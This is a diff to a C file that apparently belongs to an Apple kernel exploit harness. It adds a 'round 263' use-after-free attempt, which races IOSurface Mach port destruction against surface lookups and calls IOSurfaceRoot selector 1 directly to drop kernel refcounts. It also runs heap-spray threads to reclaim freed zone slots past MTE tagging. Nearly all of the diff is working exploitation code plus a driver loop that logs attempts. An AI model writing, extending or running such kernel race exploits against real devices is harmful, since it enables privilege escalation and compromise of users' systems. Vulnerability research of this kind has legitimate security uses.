@@ -1728,6 +1728,204 @@ static void *r259_unreg_fn(void *arg) {
     return NULL;
 }
 
+/* r263: IOSurface Mach port no-senders race + direct IOSurfaceRoot sel1 race
+ * Strategy: bypass Metal's reference counting entirely.
+ * 1) Create IOSurface → Mach port → drop all refs → no-senders notification
+ *    fires asynchronously → race with IOSurfaceLookupFromMachPort
+ * 2) Call IOSurfaceRoot sel1 (s_release_surface) with surface ID to
+ *    decrement kernel refcount directly, racing with surface access
+ * 3) Heap spray: rapidly allocate/free same-size IOSurfaces to reclaim
+ *    freed zone slots with different MTE tags */
+#include <mach/mach.h>
+
+static volatile int r263_run = 0;
+static volatile int r263_created = 0;
+static volatile int r263_port_races = 0;
+static volatile int r263_port_found = 0;
+static volatile int r263_sel1_ok = 0;
+static volatile int r263_sel1_fail = 0;
+static volatile int r263_spray_count = 0;
+static volatile int r263_lookup_races = 0;
+static volatile int r263_lookup_found = 0;
+
+/* Shared state for cross-thread racing */
+static volatile uint32_t r263_active_id = 0;
+static volatile mach_port_t r263_active_port = MACH_PORT_NULL;
+static volatile int r263_phase = 0; /* 0=idle, 1=surface_live, 2=releasing */
+
+/* Thread A: Create IOSurfaces, hand off to racers, destroy via Mach port path */
+static void *r263_creator_fn(void *arg) {
+    int w = 256, h = 256, bpe = 4, bpr = w * bpe;
+    int pf = 0x42475241; /* BGRA */
+    int alloc_sz = bpr * h;
+
+    while (r263_run) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+        CFRelease(props);
+        if (!surf) continue;
+
+        uint32_t sid = IOSurfaceGetID(surf);
+        mach_port_t port = IOSurfaceCreateMachPort(surf);
+
+        /* Signal racers: surface is live */
+        r263_active_id = sid;
+        r263_active_port = port;
+        __sync_synchronize();
+        r263_phase = 1;
+        __sync_fetch_and_add(&r263_created, 1);
+
+        /* Tiny spin to widen race window */
+        for (volatile int i = 0; i < 50; i++);
+
+        /* Enter release phase — racers should try NOW */
+        r263_phase = 2;
+        __sync_synchronize();
+
+        /* Drop userspace ref — kernel refcount still held by port */
+        CFRelease(surf);
+
+        /* Spin a bit more for racers */
+        for (volatile int i = 0; i < 20; i++);
+
+        /* Destroy Mach port — triggers no-senders notification */
+        if (port != MACH_PORT_NULL) {
+            mach_port_deallocate(mach_task_self(), port);
+        }
+
+        /* Mark idle */
+        r263_phase = 0;
+        __sync_synchronize();
+    }
+    return NULL;
+}
+
+/* Thread B: Race IOSurfaceLookupFromMachPort during destruction */
+static void *r263_port_race_fn(void *arg) {
+    while (r263_run) {
+        if (r263_phase < 2) { sched_yield(); continue; }
+        mach_port_t port = r263_active_port;
+        if (port == MACH_PORT_NULL) continue;
+
+        /* Try lookup during the no-senders notification window */
+        IOSurfaceRef surf = IOSurfaceLookupFromMachPort(port);
+        __sync_fetch_and_add(&r263_port_races, 1);
+        if (surf) {
+            __sync_fetch_and_add(&r263_port_found, 1);
+            /* Access the surface — forces kernel to dereference the object */
+            IOSurfaceGetWidth(surf);
+            IOSurfaceGetHeight(surf);
+            IOSurfaceGetBytesPerRow(surf);
+            CFRelease(surf);
+        }
+    }
+    return NULL;
+}
+
+/* Thread C: Race IOSurfaceLookup(surfaceID) during destruction */
+static void *r263_id_race_fn(void *arg) {
+    while (r263_run) {
+        if (r263_phase < 2) { sched_yield(); continue; }
+        uint32_t sid = r263_active_id;
+        if (sid == 0) continue;
+
+        IOSurfaceRef surf = IOSurfaceLookup(sid);
+        __sync_fetch_and_add(&r263_lookup_races, 1);
+        if (surf) {
+            __sync_fetch_and_add(&r263_lookup_found, 1);
+            IOSurfaceGetWidth(surf);
+            CFRelease(surf);
+        }
+    }
+    return NULL;
+}
+
+/* Thread D: Call IOSurfaceRoot sel1 (s_release_surface) with surface ID
+ * to directly decrement kernel refcount, racing with normal destruction */
+static void *r263_sel1_fn(void *arg) {
+    io_connect_t conn = (io_connect_t)(uintptr_t)arg;
+    while (r263_run) {
+        if (r263_phase < 1) { sched_yield(); continue; }
+        uint32_t sid = r263_active_id;
+        if (sid == 0) continue;
+
+        /* Try multiple input formats for sel1 (s_release_surface) */
+        uint64_t scalar_in = (uint64_t)sid;
+        kern_return_t kr;
+
+        /* Format 1: scalar only — surface ID */
+        kr = IOConnectCallScalarMethod(conn, 1, &scalar_in, 1, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&r263_sel1_ok, 1);
+        else __sync_fetch_and_add(&r263_sel1_fail, 1);
+
+        /* Format 2: struct input — packed surface ID */
+        uint32_t struct_in[2] = { sid, 0 };
+        kr = IOConnectCallMethod(conn, 1, NULL, 0, struct_in, 8, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&r263_sel1_ok, 1);
+        else __sync_fetch_and_add(&r263_sel1_fail, 1);
+
+        /* Format 3: struct input — just the ID as 4 bytes */
+        kr = IOConnectCallMethod(conn, 1, NULL, 0, &sid, 4, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&r263_sel1_ok, 1);
+        else __sync_fetch_and_add(&r263_sel1_fail, 1);
+    }
+    return NULL;
+}
+
+/* Thread E: Heap spray — allocate same-size IOSurfaces to reclaim freed slots */
+static void *r263_spray_fn(void *arg) {
+    int w = 256, h = 256, bpe = 4, bpr = w * bpe;
+    int pf = 0x42475241;
+    int alloc_sz = bpr * h;
+    IOSurfaceRef spray[32];
+    memset(spray, 0, sizeof(spray));
+    int spray_idx = 0;
+
+    while (r263_run) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+        CFRelease(props);
+        if (!s) continue;
+
+        /* Rotate spray buffer — keep 32 surfaces alive to fill zone free list */
+        if (spray[spray_idx]) CFRelease(spray[spray_idx]);
+        spray[spray_idx] = s;
+        spray_idx = (spray_idx + 1) & 31;
+        __sync_fetch_and_add(&r263_spray_count, 1);
+    }
+
+    for (int i = 0; i < 32; i++) if (spray[i]) CFRelease(spray[i]);
+    return NULL;
+}
+
 /* r262: Metal GPU race with proper objc_msgSend casting for arm64e */
 #include <objc/runtime.h>
 #include <objc/message.h>
@@ -20618,6 +20816,111 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 263) {
+            rlog("*** rounds=263: IOSurface Mach port no-senders + sel1 race ***\n");
+            rlog("  Bypass Metal reference counting entirely.\n");
+            rlog("  Race: Mach port destruction → no-senders notification vs IOSurfaceLookup\n");
+            rlog("  Also: IOSurfaceRoot sel1 (release_surface) with surface ID\n");
+            rlog("  Heap spray to reclaim freed zone slots with different MTE tags\n\n");
+
+            char r263_sp[256];
+            { char *h = getenv("HOME"); snprintf(r263_sp, sizeof(r263_sp), "%s/Documents/uaf263_state.bin", h?h:"/tmp"); }
+            int r263_att = 0;
+            { FILE *f = fopen(r263_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0263) fread(&r263_att,4,1,f); fclose(f); } }
+            r263_att++;
+            rlog("  Attempt #%d\n", r263_att);
+            { FILE *f = fopen(r263_sp, "wb"); if (f) { uint32_t m=0xDEAD0263; fwrite(&m,4,1,f); fwrite(&r263_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r263_secs = 30;
+            if (argc > 3) r263_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r263_secs);
+            fflush(stdout);
+
+            /* Open IOSurfaceRoot connection for sel1 calls */
+            io_service_t r263_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r263_conn = IO_OBJECT_NULL;
+            if (r263_svc) IOServiceOpen(r263_svc, mach_task_self(), 0, &r263_conn);
+            rlog("  IOSurfaceRoot conn=%u\n", r263_conn);
+
+            r263_run = 1;
+            r263_created = 0; r263_port_races = 0; r263_port_found = 0;
+            r263_sel1_ok = 0; r263_sel1_fail = 0; r263_spray_count = 0;
+            r263_lookup_races = 0; r263_lookup_found = 0;
+            r263_phase = 0;
+
+            /* 2 creator/destroyer threads */
+            pthread_t r263_creators[2];
+            for (int i = 0; i < 2; i++)
+                pthread_create(&r263_creators[i], NULL, r263_creator_fn, NULL);
+
+            /* 4 port race threads */
+            pthread_t r263_port_racers[4];
+            for (int i = 0; i < 4; i++)
+                pthread_create(&r263_port_racers[i], NULL, r263_port_race_fn, NULL);
+
+            /* 2 ID lookup race threads */
+            pthread_t r263_id_racers[2];
+            for (int i = 0; i < 2; i++)
+                pthread_create(&r263_id_racers[i], NULL, r263_id_race_fn, NULL);
+
+            /* 2 sel1 race threads */
+            pthread_t r263_sel1_threads[2];
+            if (r263_conn) {
+                for (int i = 0; i < 2; i++)
+                    pthread_create(&r263_sel1_threads[i], NULL, r263_sel1_fn,
+                        (void*)(uintptr_t)r263_conn);
+            }
+
+            /* 2 heap spray threads */
+            pthread_t r263_spray_threads[2];
+            for (int i = 0; i < 2; i++)
+                pthread_create(&r263_spray_threads[i], NULL, r263_spray_fn, NULL);
+
+            /* Also run sel17/18 churn for additional kernel contention */
+            g_race250_conn = r263_conn;
+            g_race250_run = r263_conn ? 1 : 0;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            pthread_t r263_t17, r263_t18;
+            if (r263_conn) {
+                pthread_create(&r263_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r263_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r263_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds created=%d port_race=%d/%d id_race=%d/%d sel1=%d/%d spray=%d s17=%d/%d\n",
+                     s+1, r263_created,
+                     r263_port_races, r263_port_found,
+                     r263_lookup_races, r263_lookup_found,
+                     r263_sel1_ok, r263_sel1_fail,
+                     r263_spray_count,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r263_run = 0;
+            g_race250_run = 0;
+            for (int i = 0; i < 2; i++) pthread_join(r263_creators[i], NULL);
+            for (int i = 0; i < 4; i++) pthread_join(r263_port_racers[i], NULL);
+            for (int i = 0; i < 2; i++) pthread_join(r263_id_racers[i], NULL);
+            if (r263_conn) {
+                for (int i = 0; i < 2; i++) pthread_join(r263_sel1_threads[i], NULL);
+                pthread_join(r263_t17, NULL);
+                pthread_join(r263_t18, NULL);
+                IOServiceClose(r263_conn);
+            }
+            for (int i = 0; i < 2; i++) pthread_join(r263_spray_threads[i], NULL);
+            if (r263_svc) IOObjectRelease(r263_svc);
+
+            rlog("\n  === SURVIVED IOSurface Mach port race! ===\n");
+            rlog("  created=%d port_race=%d/%d id_race=%d/%d sel1=%d/%d spray=%d\n",
+                 r263_created, r263_port_races, r263_port_found,
+                 r263_lookup_races, r263_lookup_found,
+                 r263_sel1_ok, r263_sel1_fail, r263_spray_count);
+            rlog("*** r=263 complete ***\n");
             goto done;
         }
         if (rounds == 262) {
